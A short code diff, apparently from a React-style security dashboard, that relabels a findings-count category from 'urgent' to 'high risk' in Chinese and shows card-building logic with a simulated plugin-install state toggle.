-      prog: [['新发现', '14', '其中紧急 4'], ['已解决', '9', '复检通过'], ['待复检', '2', '已修复，等待确认'], ['已忽略', '1', '附忽略原因'], ['旧环境归档', '1', '重装前的风险']].map(([n, v, s2]) => ({ n, v, s: s2 })),
+      prog: [['新发现', '14', '其中高危 4'], ['已解决', '9', '复检通过'], ['待复检', '2', '已修复，等待确认'], ['已忽略', '1', '附忽略原因'], ['旧环境归档', '1', '重装前的风险']].map(([n, v, s2]) => ({ n, v, s: s2 })),
       caps: CAP.map(([n, k, m, fl, f, mm, d]) => { const ps = plug[n] || ''; const isP = m === 'plug'; const on = !isP || ps === 'ok';
         return { n, k, d: d || '', fl, f, m: mm, a: on ? 64 : 0, fc: f ? 'r' : '', lock: isP && !on, btn: isP && !on, bt: ps === 'ing' ? '安装中…' : '安装插件', tag: on, st: k === '企业版' ? '企业版' : '已开启', tc: k === '企业版' ? 'sh-ent' : 'sh-on', cls: on ? 'sh-cc' : 'sh-cc off',
           go: () => { if (ps) return; this.setState({ plug: Object.assign({}, plug, { [n]: 'ing' }) }); setTimeout(() => this.setState({ plug: Object.assign({}, this.state.plug || {}, { [n]: 'ok' }) }), 1600); } }; })
